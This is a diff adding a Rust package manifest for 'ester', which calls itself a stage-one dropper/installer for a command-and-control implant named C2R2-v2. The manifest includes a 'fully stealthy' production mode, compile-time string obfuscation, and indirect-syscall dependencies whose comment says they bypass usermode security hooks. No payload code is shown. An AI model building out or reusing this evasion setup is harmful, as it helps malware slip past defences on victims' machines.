@@ -1,0 +1,44 @@
+[package]
+name = "ester"
+version = "2.0.0"
+edition = "2021"
+description = "Stage 1: ESTER - Minimal dropper/installer wrapper for C2R2-v2"
+
+[features]
+default = ["dev"]
+dev = []  # Development mode: console window + debug prints
+production = []  # Production mode: no console, no debug prints, fully stealthy
+
+[dependencies]
+# String obfuscation at compile-time
+obfstr = "0.4"
+# Random number generation
+rand = "0.8"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = [
+    "errhandlingapi",
+    "libloaderapi",
+    "memoryapi",
+    "winnt",
+    "minwindef",
+    "ntdef",
+    "processthreadsapi",
+    "synchapi",
+    "winbase",
+    "debugapi",
+    "sysinfoapi",
+    "fileapi",
+    "handleapi",
+    "winuser"
+] }
+# Indirect syscalls - dinvk provides DInvoke-style syscall execution
+# Bypasses usermode hooks by dynamically resolving and executing syscalls
+dinvk = "0.4"
+
+[[bin]]
+name = "ester"
+path = "src/main.rs"
+
+[build-dependencies]
+winres = "0.1.12"
